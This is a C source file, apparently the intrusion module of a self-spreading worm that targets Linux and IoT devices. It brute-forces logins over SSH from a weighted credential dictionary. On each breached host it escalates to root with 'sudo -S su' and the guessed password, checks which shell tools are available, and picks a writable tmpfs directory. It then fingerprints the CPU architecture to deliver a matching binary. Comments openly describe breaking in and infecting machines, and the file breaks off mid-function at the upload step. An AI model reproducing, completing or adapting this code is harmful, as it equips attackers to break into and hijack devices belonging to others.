#include "bne.h"
#include "util_ct.h"
#include "util_rt.h"
#include "iset.h"
#include "llist.h"
#include "rnd.h"
#include "libssh2.h"
#include "iobuf.h"
#include "endian.h"

#include <string.h>
#include <ctype.h>
#include <errno.h>

#include <elf.h>


static const struct timespec BNE_CONN_OP_TIMEOUT = { 60, 0 }; // 1m
static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 }; // 10s
static const struct timespec BNE_CLOSE_OP_TIMEOUT = { 1, 0 }; // 1s
static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms
static const struct timespec BNE_PROMPT_PAUSE = { 4, 0 }; // 4s

#define BNE_CONN_TIMEOUT 5000 // 5s
#define BNE_CONN_ATTEMPT 3

#define BNE_HDELAY_TYPE_MIN		150		// 150ms
#define BNE_HDELAY_TYPE_VAR		100		// 100ms
#define BNE_HDELAY_PROMPT_MIN	800		// 0.8s
#define BNE_HDELAY_PROMPT_VAR	1000	// 1s

#define BNE_AVAIL_CMD_ECHO		0x01
#define BNE_AVAIL_CMD_CAT		0x02
#define BNE_AVAIL_CMD_DD		0x04
#define BNE_AVAIL_CMD_BASE64	0x08


struct prne_bne {
	prne_iset_t cred_set;
	prne_rnd_t rnd;
	prne_bne_result_t result;
	prne_bne_param_t param;
};

typedef struct {
	unsigned int attempt;
	uint16_t port;
} bne_port_t;

typedef struct {
	LIBSSH2_SESSION *ss;
	LIBSSH2_CHANNEL *ch_shell;
	char *auth_list;
	int fd;
	prne_llist_t ports;
} bne_vssh_ctx_t;

typedef unsigned int bne_avail_cmds_t;

typedef struct {
	void *ctx;
	ssize_t (*read_f) ( // combines stdout and stderr
		void *ctx,
		void *buf,
		const size_t len,
		pth_event_t ev);
	ssize_t (*write_f) ( // loops on the buf to always return len or -1
		void *ctx,
		const void *buf,
		const size_t len,
		pth_event_t ev);
	int (*pollin_f) (void *ctx);
	/* Newline sequence to send
	* "\r\n" for telnet. "\n" for anything else.
	*
	* We should send "\r\0", not "\r\n" as specified in the protocol, but it's
	* tricky to implement. Most server implementations will understand any
	* newline sequence anyways.
	*/
	const char *nl;
	uint8_t buf[2048];
	char *upload_dir;
	pth_event_t ev;
	prne_iobuf_t ib;
	prne_llist_t up_loc; // series of null-terminated string
	prne_bin_rcb_ctx_t rcb;
	bne_avail_cmds_t avail_cmds;
	char stx_str[37];
	char eot_str[37];
} bne_sh_ctx_t;

static void bne_sh_ctx_free_mp (bne_sh_ctx_t *p) {
	for (prne_llist_entry_t *e = p->up_loc.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_llist_clear(&p->up_loc);
}

static void bne_init_sh_ctx (bne_sh_ctx_t *p, prne_rnd_t *rnd) {
	uint8_t uuid[16];

	prne_memzero(p, sizeof(bne_sh_ctx_t));
	prne_init_llist(&p->up_loc);
	prne_init_iobuf(&p->ib);
	prne_iobuf_setextbuf(&p->ib, p->buf, sizeof(p->buf), 0);
	prne_init_bin_rcb_ctx(&p->rcb);

	if (!prne_rnd(rnd, uuid, 16)) {
		memset(uuid, 0xAA, 16);
	}
	prne_uuid_tostr(uuid, p->stx_str);

	if (!prne_rnd(rnd, uuid, 16)) {
		memset(uuid, 0xBB, 16);
	}
	prne_uuid_tostr(uuid, p->eot_str);
}

static void bne_free_sh_ctx (bne_sh_ctx_t *p) {
	bne_sh_ctx_free_mp(p);
	prne_free_llist(&p->up_loc);
	prne_free(p->upload_dir);
	pth_event_free(p->ev, FALSE);
	prne_free_bin_rcb_ctx(&p->rcb);

	prne_memzero(p, sizeof(bne_sh_ctx_t));
}

static bool bne_build_cred_set (prne_bne_t *ctx) {
	bool ret = true;

	prne_iset_clear(&ctx->cred_set);
	for (size_t i = 0; ret && i < ctx->param.cred_dict->cnt; i += 1) {
		ret = prne_iset_insert(
			&ctx->cred_set,
			(prne_iset_val_t)(ctx->param.cred_dict->arr + i));
	}

	return ret;
}

static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
	prne_cred_dict_entry_t *ent;
	const char *ent_id;

	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
		return;
	}

	for (size_t i = 0; i < ctx->cred_set.size;) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		ent_id = ctx->param.cred_dict->m + ent->id;

		if (strcmp(id, ent_id) == 0) {
			prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)ent);
		}
		else {
			i += 1;
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd();
	}
}

static void bne_free_result_cred (prne_bne_t *ctx) {
	prne_free(ctx->result.cred.id);
	prne_free(ctx->result.cred.pw);
	ctx->result.cred.id = NULL;
	ctx->result.cred.pw = NULL;
}

/*
* Does linear search to save memory. This is slow. But hey, as long as it works.
*/
static bool bne_pop_cred (
	prne_bne_t *ctx,
	const bool per_id)
{
	prne_cred_dict_entry_t *ent, *rc = NULL;
	size_t coin;
	uint_fast16_t w_tmp;
	uint8_t wv;
	prne_iset_t w_set;
	prne_llist_t cl;
	const char *ent_id, *ent_pw;
	bool ret = true, id_match;

	if (ctx->cred_set.size == 0) {
		return false;
	}
	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
		ctx->result.err = errno;
		return false;
	}

	prne_init_iset(&w_set);
	prne_init_llist(&cl);

	// gather weight values
	for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		if (!prne_iset_insert(&w_set, (prne_iset_val_t)(ent->weight))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}
	}

	do {
		w_tmp = 0;
		for (size_t i = 0; i < w_set.size; i += 1) {
			w_tmp += (uint_fast16_t)w_set.arr[i];
		}

		// determine weight
		if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}

		if (w_tmp > 0) {
			coin = coin % w_tmp;

			w_tmp = 0;
			wv = (uint8_t)(w_set.arr[w_set.size - 1]);
			for (size_t i = 0; i < w_set.size; i += 1) {
				w_tmp += (uint_fast16_t)w_set.arr[i];
				if (coin < w_tmp) {
					wv = (uint8_t)(w_set.arr[i]);
					break;
				}
			}
		}
		else {
			wv = 0;
		}

		// search
		prne_llist_clear(&cl);
		for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
			ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
			ent_id = ctx->param.cred_dict->m + ent->id;

			if (per_id && ctx->result.cred.id != NULL) {
				id_match = strcmp(ctx->result.cred.id, ent_id) == 0;
			}
			else {
				id_match = true;
			}

			if (id_match && ent->weight == wv) {
				if (!prne_llist_append(&cl, (prne_llist_element_t)ent)) {
					ret = false;
					ctx->result.err = errno;
					goto END;
				}
			}
		}

		if (cl.size > 0) {
			prne_llist_entry_t *le;

			if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
				ctx->result.err = errno;
				ret = false;
				goto END;
			}
			coin = coin % cl.size;

			le = cl.head;
			for (size_t i = 0; i < coin; i += 1) {
				le = le->next;
			}

			rc = (prne_cred_dict_entry_t*)le->element;
			goto END;
		}
		else {
			// try next weight value
			prne_iset_erase(&w_set, (prne_iset_val_t)(wv));
		}
	} while (w_set.size > 0);

END:
	prne_free_iset(&w_set);
	prne_free_llist(&cl);
	bne_free_result_cred(ctx);
	if (rc != NULL && ret) {
		size_t id_len, pw_len;

		prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)rc);

		ent_id = ctx->param.cred_dict->m + rc->id;
		ent_pw = ctx->param.cred_dict->m + rc->pw;
		id_len = strlen(ent_id);
		pw_len = strlen(ent_pw);

		ctx->result.cred.id = prne_alloc_str(id_len);
		ctx->result.cred.pw = prne_alloc_str(pw_len);
		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			ctx->result.err = errno;
			ret = false;
			bne_free_result_cred(ctx);
		}
		else {
			memcpy(ctx->result.cred.id, ent_id, id_len + 1);
			memcpy(ctx->result.cred.pw, ent_pw, pw_len + 1);
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd();
	}

	return ret;
}

static bool bne_do_connect (
	const int af,
	const struct sockaddr *sa,
	const socklen_t sl,
	int *fd,
	pth_event_t ev)
{
	int f_ret;
	struct pollfd pfd;

	*fd = socket(af, SOCK_STREAM, 0);
	if (*fd < 0) {
		return false;
	}
	if (!prne_sck_fcntl(*fd)) {
		return false;
	}

	f_ret = connect(*fd, sa, sl);
	if (f_ret < 0 && errno != EINPROGRESS) {
		goto ERR;
	}

	pfd.fd = *fd;
	pfd.events = POLLOUT;
	f_ret = prne_pth_poll(&pfd, 1, BNE_CONN_TIMEOUT, ev);
	if (f_ret > 0) {
		socklen_t sl = sizeof(int);
		int sov = 0;

		if (!(pfd.revents & ~POLLOUT) &&
			getsockopt(*fd, SOL_SOCKET, SO_ERROR, &sov, &sl) == 0)
		{
			if (sov == 0) {
				return true;
			}
			errno = sov;
		}
	}

ERR:
	prne_close(*fd);
	*fd = -1;
	return true;
}

/*******************************************************************************
                              Telnet Vector Impl
*******************************************************************************/
static bool bne_do_vec_telnet (prne_bne_t *ctx) {
	// TODO
	return false;
}

/*******************************************************************************
                           Shell Op Abstraction Layer
*******************************************************************************/
typedef struct {
	char *path;
	size_t weight;
} bne_mp_t;

static int bne_mp_cmp_f (const void *a, const void *b) {
	const size_t w_a = ((const bne_mp_t*)a)->weight;
	const size_t w_b = ((const bne_mp_t*)b)->weight;

	return
		(w_a < w_b) ? -1 :
		(w_a > w_b) ? 1 :
		0;
}

typedef struct {
	void *ctx;
	void (*line_f)(void *ctx, char *line);
	size_t (*bin_f)(void *ctx, uint8_t *m, size_t len);
} bne_sh_parser_t;

static void bne_init_sh_parser (bne_sh_parser_t *p) {
	prne_memzero(p, sizeof(bne_sh_parser_t));
}

static void bne_free_sh_parser (bne_sh_parser_t *p) {}

static bool bne_sh_send (
	bne_sh_ctx_t *s_ctx,
	const char *cmdline)
{
	const size_t len = strlen(cmdline);
	ssize_t f_ret;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 3) {
		prne_dbgpf(
			"bne@%"PRIxPTR"\t: bne_sh_send():\n%s\n",
			(uintptr_t)s_ctx->ctx,
			cmdline);
	}

	prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, cmdline, len, s_ctx->ev);
	if (f_ret <= 0 || (size_t)f_ret != len) {
		return false;
	}
	return true;
}

static char *bne_sh_mknexted_cmd (bne_sh_ctx_t *s_ctx, const char *cmd) {
	const char *sb[] = {
		s_ctx->nl, "echo -n ", s_ctx->stx_str, s_ctx->nl,
		cmd, s_ctx->nl,
		"echo -n ", s_ctx->eot_str, s_ctx->nl
	};

	return prne_build_str(sb, sizeof(sb)/sizeof(const char*));
}

static bool bne_sh_sync_stx (bne_sh_ctx_t *s_ctx) {
	ssize_t f_ret;
	char *delim;

	while (true) {
		delim = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			s_ctx->stx_str,
			sizeof(s_ctx->stx_str) - 1);
		if (delim == NULL) {
			prne_iobuf_shift(
				&s_ctx->ib,
				-(s_ctx->ib.len /
					(sizeof(s_ctx->stx_str) - 1) *
					(sizeof(s_ctx->stx_str) - 1)));
		}
		else {
			prne_iobuf_shift(
				&s_ctx->ib,
				-(delim - (char*)s_ctx->ib.m + (sizeof(s_ctx->stx_str) - 1)));
			break;
		}

		prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			return false;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

	return true;
}

static bool bne_sh_runcmd_line (
	bne_sh_ctx_t *s_ctx,
	bne_sh_parser_t *p_ctx,
	const char *cmd)
{
	bool ret = false;
	char *nested = bne_sh_mknexted_cmd(s_ctx, cmd);
	char *delim[2];
	ssize_t f_ret;

	if (nested == NULL || !bne_sh_send(s_ctx, nested)) {
		goto END;
	}

	if (!bne_sh_sync_stx(s_ctx)) {
		goto END;
	}

	// do parse
	while (true) {
		delim[0] = prne_strnchr((char*)s_ctx->ib.m, '\r', s_ctx->ib.len);
		delim[1] = prne_strnchr((char*)s_ctx->ib.m, '\n', s_ctx->ib.len);
		if (delim[1] != NULL) {
			if (delim[0] != NULL && delim[0] + 1 == delim[1]) {
				// CrLf
				*delim[0] = 0;
			}
			else {
				*delim[1] = 0;
			}

			if (p_ctx->line_f != NULL) {
				p_ctx->line_f(p_ctx->ctx, (char*)s_ctx->ib.m);
			}

			prne_iobuf_shift(
				&s_ctx->ib,
				-(delim[1] - (char*)s_ctx->ib.m + 1));
			continue;
		}
		else {
			delim[0] = prne_strnstr(
				(char*)s_ctx->ib.m,
				s_ctx->ib.len,
				s_ctx->eot_str,
				sizeof(s_ctx->eot_str) - 1);
			if (delim[0] != NULL) {
				prne_iobuf_reset(&s_ctx->ib);
				ret = true;
				break;
			}
		}

		prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

END:
	prne_free(nested);
	return ret;
}

static bool bne_sh_runcmd_bin (
	bne_sh_ctx_t *s_ctx,
	bne_sh_parser_t *p_ctx,
	const char *cmd)
{
	bool ret = false;
	char *nested = bne_sh_mknexted_cmd(s_ctx, cmd);
	char *delim;
	ssize_t f_ret;
	size_t consume;

	if (nested == NULL || !bne_sh_send(s_ctx, nested)) {
		goto END;
	}

	if (!bne_sh_sync_stx(s_ctx)) {
		goto END;
	}

	// do parse
	while (true) {
		if (p_ctx->bin_f != NULL && s_ctx->ib.len > 0) {
			consume = p_ctx->bin_f(p_ctx->ctx, s_ctx->ib.m, s_ctx->ib.len);
		}
		else {
			consume = s_ctx->ib.len;
		}

		delim = prne_strnstr(
			(char*)s_ctx->ib.m,
			s_ctx->ib.len,
			s_ctx->eot_str,
			sizeof(s_ctx->eot_str) - 1);
		if (delim != NULL) {
			prne_iobuf_reset(&s_ctx->ib);
			ret = true;
			break;
		}
		else {
			prne_iobuf_shift(&s_ctx->ib, -consume);
		}

		prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

END:
	prne_free(nested);
	return ret;
}

static bool bne_sh_sync (bne_sh_ctx_t *s_ctx) {
	bne_sh_parser_t parser;

	parser.ctx = NULL;
	parser.line_f = NULL;
	return bne_sh_runcmd_line(s_ctx, &parser, NULL);
}

static void bne_sh_int_parse_f (void *ctx, char *line) {
	int *v = (int*)ctx;
	if (line[0] != 0) { // ignore empty line
		sscanf(line, "%d", v);
	}
}

static int bne_sh_get_uid (bne_sh_ctx_t *s_ctx) {
	bne_sh_parser_t parser;
	int uid = 0;

	parser.ctx = &uid;
	parser.line_f = bne_sh_int_parse_f;

	if (!bne_sh_runcmd_line(s_ctx, &parser, "id -u")) {
		return -1;
	}

	return uid;
}

static bool bne_sh_sudo (prne_bne_t *ctx, bne_sh_ctx_t *s_ctx) {
	const char *sb[] = {
		"sudo -S su; echo -n ", s_ctx->eot_str, s_ctx->nl
	};
	bool ret = false;
	ssize_t f_ret;
	char *cmd = NULL, *delim;

	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	if (cmd == NULL) {
		goto END;
	}
	if (!bne_sh_send(s_ctx, cmd)) {
		goto END;
	}

	while (true) {
		prne_pth_reset_timer(&s_ctx->ev, &BNE_PROMPT_PAUSE);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			break;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

	if (pth_event_status(s_ctx->ev) != PTH_STATUS_OCCURRED) {
		ctx->result.err = errno;
		goto END;
	}
	delim = prne_strnstr(
		(char*)s_ctx->ib.m,
		s_ctx->ib.len,
		s_ctx->eot_str,
		sizeof(s_ctx->eot_str) - 1);
	if (delim != NULL) {
		// UID is not 0, but sudo command is not available
		prne_iobuf_reset(&s_ctx->ib);
		ctx->result.err = EPERM;
		goto END;
	}

	if (!(bne_sh_send(s_ctx, ctx->result.cred.pw) &&
		bne_sh_send(s_ctx, s_ctx->nl)))
	{
		ctx->result.err = errno;
		goto END;
	}

	// check the uid again
	ret = bne_sh_sync(s_ctx) && bne_sh_get_uid(s_ctx) == 0;

END:
	prne_free(cmd);
	return ret;
}

static void bne_sh_availcmd_parse_f (void *ctx, char *line) {
	bne_sh_ctx_t *s_ctx = (bne_sh_ctx_t*)ctx;
	int ec;

	if (sscanf(line, "echo: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_ECHO;
	}
	else if (sscanf(line, "cat: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_CAT;
	}
	else if (sscanf(line, "dd: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_DD;
	}
	else if (sscanf(line, "base64: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_BASE64;
	}
}

typedef struct {
	bne_sh_ctx_t *s_ctx;
	int err;
} bne_mp_parse_ctx_t;

static void bne_sh_mounts_parse_f (void *ctx_p, char *line) {
	bne_mp_parse_ctx_t *ctx = (bne_mp_parse_ctx_t*)ctx_p;
	char val[256];
	char *mp;
	size_t len;

	// fs
	if (sscanf(line, "%*s %*s %255s %*s %*d %*d", val) != 1) {
		return;
	}
	if (!(strcmp(val, "devtmpfs") == 0 || strcmp(val, "tmpfs") == 0)) {
		return;
	}
	// options
	if (sscanf(line, "%*s %*s %*s %255s %*d %*d", val) != 1) {
		return;
	}
	if (strstr(val, "rw") != val) {
		return;
	}
	// mount point
	if (sscanf(line, "%*s %255s %*s %*s %*d %*d", val) != 1) {
		return;
	}

	len = strlen(val);
	mp = prne_alloc_str(len);
	if (mp == NULL) {
		ctx->err = errno;
		return;
	}
	memcpy(mp, val, len + 1);
	if (prne_llist_append(
		&ctx->s_ctx->up_loc,
		(prne_llist_element_t)mp) == NULL)
	{
		ctx->err = errno;
		prne_free(mp);
		return;
	}
}

typedef struct {
	int err;
	uint16_t e_machine;
	uint8_t e_data;
} bne_sh_elf_parse_ctx_t;

static size_t bne_sh_elf_parse_f (
	void *ctx_p,
	uint8_t *m,
	size_t len)
{
	bne_sh_elf_parse_ctx_t *ctx = (bne_sh_elf_parse_ctx_t*)ctx_p;

	if (ctx->err != 0) {
		return len;
	}
	if (ctx->e_data == 0) {
		const Elf32_Ehdr *hdr = (const Elf32_Ehdr*)m;

		if (len < sizeof(Elf32_Ehdr)) {
			return 0;
		}

		if (!(m[EI_MAG0] == ELFMAG0 &&
			m[EI_MAG1] == ELFMAG1 &&
			m[EI_MAG2] == ELFMAG2 &&
			m[EI_MAG3] == ELFMAG3) ||
			(m[EI_CLASS] != ELFCLASS32 && m[EI_CLASS] != ELFCLASS64))
		{
			ctx->err = ENOEXEC;
			return len;
		}

		ctx->e_data = m[EI_DATA];
		switch (ctx->e_data) {
		case ELFDATA2LSB: ctx->e_machine = prne_le16toh(hdr->e_machine); break;
		case ELFDATA2MSB: ctx->e_machine = prne_be16toh(hdr->e_machine); break;
		default:
			ctx->err = ENOEXEC;
			return len;
		}
	}

	return len;
}

typedef struct {
	bool v7;
	bool vfp;
	bool thumb;
} bne_sh_cpuinfo_parse_ctx_t;

static void bne_sh_cpuinfo_parse_f (void *ctx_p, char *line) {
	bne_sh_cpuinfo_parse_ctx_t *ctx = (bne_sh_cpuinfo_parse_ctx_t*)ctx_p;

	prne_transstr(line, tolower);

	if ((strstr(line, "processor") == line ||
		strstr(line, "model name") == line) &&
		strstr(line, "v7") != NULL)
	{
		ctx->v7 = true;
	}
	else if (strstr(line, "features") == line) {
		if (strstr(line, "vfp") != NULL) {
			ctx->vfp = true;
		}
		if (strstr(line, "thumb") != NULL) {
			ctx->thumb = true;
		}
	}
}

/*
* 1. Escalate shell if $(id -u) -ne 0
*	- Run "sudo su"
*	- Wait for prompt //.*:
*	- Type password
* 2. Check available commands
*	- echo
*	- cat
*	- dd
*	- base64
*	- touch
*	(if echo and cat not available, give up)
* 3. Find a suitable mount point for upload
*	- read /proc/mounts
*	- filter out ro, non-ephemeral fs
*	- prioritise:
*		/tmp: 4
*		/run: 3
*		/dev/shm: 2
*		/dev: 1
*		(other): 0
* 4. Determine arch
*/
static bool bne_sh_setup (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx)
{
	bool ret = false;
	char *mp;
	pth_event_t ev = NULL;
	int uid;
	bne_mp_t *mp_arr = NULL;
	size_t mp_cnt = 0;
	prne_llist_entry_t *m_ent;
	bne_sh_parser_t parser;

	bne_sh_ctx_free_mp(s_ctx);
	bne_init_sh_parser(&parser);

// TRY
	// Skip banner
	if (!bne_sh_sync(s_ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	// Check uid
	uid = bne_sh_get_uid(s_ctx);
	if (uid < 0) {
		ctx->result.err = errno;
		goto END;
	}
	if (uid != 0) {
		// Not root. Try escalating the shell
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: broke in as uid %d. Trying sudo...\n",
				(uintptr_t)ctx,
				uid);
		}

		if (!bne_sh_sudo(ctx, s_ctx)) {
			// sudo failed. no point infecting unprivileged machine
			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
				prne_dbgpf(
					"bne@%"PRIxPTR"\t: sudo failed\n",
					(uintptr_t)ctx);
			}
			goto END;
		}
	}

	{
		// available commands
		const char *sb[] = {
			"echo 2> /dev/null > /dev/null; echo echo: $?", s_ctx->nl,
			"echo | cat 2> /dev/null > /dev/null; echo cat: $?", s_ctx->nl,
			"echo | dd 2> /dev/null > /dev/null; echo dd: $?", s_ctx->nl,
			"echo | base64 2> /dev/null > /dev/null; echo base64: $?", s_ctx->nl
		};
		char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));

		if (cmd == NULL) {
			ctx->result.err = errno;
			goto END;
		}

		bne_free_sh_parser(&parser);
		bne_init_sh_parser(&parser);
		parser.ctx = s_ctx;
		parser.line_f = bne_sh_availcmd_parse_f;

		ret = bne_sh_runcmd_line(s_ctx, &parser, cmd);
		prne_free(cmd);
		if (!ret) {
			ctx->result.err = errno;
			goto END;
		}
	}
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
		prne_dbgpf(
			"bne@%"PRIxPTR"\t: available commands - ",
			(uintptr_t)ctx);
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) {
			prne_dbgpf("echo ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT) {
			prne_dbgpf("cat ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_DD) {
			prne_dbgpf("dd ");
		}
		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_BASE64) {
			prne_dbgpf("base64 ");
		}
		prne_dbgpf("\n");
	}
	if (!((s_ctx->avail_cmds & BNE_AVAIL_CMD_ECHO) &&
		(s_ctx->avail_cmds & BNE_AVAIL_CMD_CAT)))
	{
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: echo and cat unavailable on this system\n",
				(uintptr_t)ctx);
		}
		ctx->result.err = ENOSYS;
		goto END;
	}

	{
		// read /proc/mounts
		bne_mp_parse_ctx_t mpc;

		prne_memzero(&mpc, sizeof(bne_mp_parse_ctx_t));
		bne_free_sh_parser(&parser);
		bne_init_sh_parser(&parser);
		parser.ctx = &mpc;
		parser.line_f = bne_sh_mounts_parse_f;
		mpc.s_ctx = s_ctx;

		if (!bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/mounts")) {
			ctx->result.err = errno;
			goto END;
		}
		if (mpc.err != 0) {
			ctx->result.err = mpc.err;
			goto END;
		}
	}

	if (s_ctx->up_loc.size == 0) {
		// no suitable mount point found
		ctx->result.err = ENOSPC;
		goto END;
	}
	// sort candidate mount points
	mp_cnt = s_ctx->up_loc.size;
	mp_arr = (bne_mp_t*)prne_malloc(sizeof(bne_mp_t), mp_cnt);
	if (mp_arr == NULL) {
		ctx->result.err = errno;
		goto END;
	}
	m_ent = s_ctx->up_loc.head;
	for (size_t i = 0; i < mp_cnt; i += 1) {
		mp = (char*)m_ent->element;
		mp_arr[i].path = mp;
		if (strcmp(mp, "/tmp") == 0) {
			mp_arr[i].weight = 4;
		}
		else if (strcmp(mp, "/run") == 0) {
			mp_arr[i].weight = 3;
		}
		else if (strcmp(mp, "/dev/shm") == 0) {
			mp_arr[i].weight = 2;
		}
		else if (strcmp(mp, "/dev") == 0) {
			mp_arr[i].weight = 1;
		}
		else {
			mp_arr[i].weight = 0;
		}
		m_ent = m_ent->next;
	}
	prne_llist_clear(&s_ctx->up_loc);
	qsort(mp_arr, mp_cnt, sizeof(bne_mp_t), bne_mp_cmp_f);
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
		prne_dbgpf(
			"bne@%"PRIxPTR"\t: suitable mount points:\n",
			(uintptr_t)ctx);
	}
	for (size_t i = 0, j = mp_cnt - 1; i < mp_cnt; i += 1, j -= 1) {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 2) {
			prne_dbgpf("%s\n", mp_arr[j].path);
		}

		if (prne_llist_append(
			&s_ctx->up_loc,
			(prne_llist_element_t)mp_arr[j].path) != NULL)
		{
			mp_arr[j].path = NULL;
		}
		else {
			ctx->result.err = errno;
			goto END;
		}
	}
	prne_free(mp_arr);
	mp_arr = NULL;
	mp_cnt = 0;

	{
		// determine arch
		bne_sh_elf_parse_ctx_t ep;
		const char *cmd;

		prne_memzero(&ep, sizeof(bne_sh_elf_parse_ctx_t));
		bne_free_sh_parser(&parser);
		bne_init_sh_parser(&parser);
		parser.ctx = &ep;
		parser.bin_f = bne_sh_elf_parse_f;

		if (s_ctx->avail_cmds & BNE_AVAIL_CMD_DD) {
			cmd = "dd if=/bin/sh bs=52 count=1 2> /dev/null";
		}
		else {
			cmd = "cat /bin/sh";
		}
		if (!bne_sh_runcmd_bin(s_ctx, &parser, cmd)) {
			ctx->result.err = errno;
			goto END;
		}

		if (ep.e_data == 0) {
			ctx->result.err = ENOEXEC;
			goto END;
		}
		if (ep.err != 0) {
			ctx->result.err = ep.err;
			goto END;
		}

		if (ep.e_machine == EM_ARM) {
			// read /proc/cpuinfo
			bne_sh_cpuinfo_parse_ctx_t cpc;

			prne_memzero(&cpc, sizeof(bne_sh_cpuinfo_parse_ctx_t));
			bne_free_sh_parser(&parser);
			bne_init_sh_parser(&parser);
			parser.ctx = &cpc;
			parser.line_f = bne_sh_cpuinfo_parse_f;

			if (!bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/cpuinfo")) {
				ctx->result.err = errno;
				goto END;
			}

			if (cpc.v7 && cpc.vfp && cpc.thumb) {
				ctx->result.arch = PRNE_ARCH_ARMV7;
			}
			else {
				ctx->result.arch = PRNE_ARCH_ARMV4T;
			}
		}
		else {
			switch (ep.e_data) {
			case ELFDATA2LSB:
				switch (ep.e_machine) {
				case EM_386: ctx->result.arch = PRNE_ARCH_I686; break;
				case EM_X86_64: ctx->result.arch = PRNE_ARCH_X86_64; break;
				case EM_AARCH64: ctx->result.arch = PRNE_ARCH_AARCH64; break;
				case EM_MIPS: ctx->result.arch = PRNE_ARCH_MPSL; break;
				case EM_SH: ctx->result.arch = PRNE_ARCH_SH4; break;
				case EM_ARC: ctx->result.arch = PRNE_ARCH_ARC; break;
				}
				break;
			case ELFDATA2MSB:
				switch (ep.e_machine) {
				case EM_MIPS: ctx->result.arch = PRNE_ARCH_MIPS; break;
				case EM_PPC: ctx->result.arch = PRNE_ARCH_PPC; break;
				case EM_68K: ctx->result.arch = PRNE_ARCH_M68K; break;
				case EM_ARC: ctx->result.arch = PRNE_ARCH_ARCEB; break;
				}
				break;
			}
		}
	}

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		const char *arch_str = prne_arch_tostr(ctx->result.arch);

		prne_dbgpf(
			"bne@%"PRIxPTR"\t: arch: %s\n",
			(uintptr_t)ctx,
			arch_str == NULL ? "?" : arch_str);
	}
	ret = ctx->result.arch != PRNE_ARCH_NONE;

END: // CATCH
	bne_free_sh_parser(&parser);
	for (size_t i = 0; i < mp_cnt; i += 1) {
		prne_free(mp_arr[i].path);
	}
	prne_free(mp_arr);
	pth_event_free(ev, FALSE);
	return ret;
}

static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
	ctx->result.prc = prne_start_bin_rcb(
		&sh_ctx->rcb,
		ctx->result.arch,
		ctx->param.rcb.self,
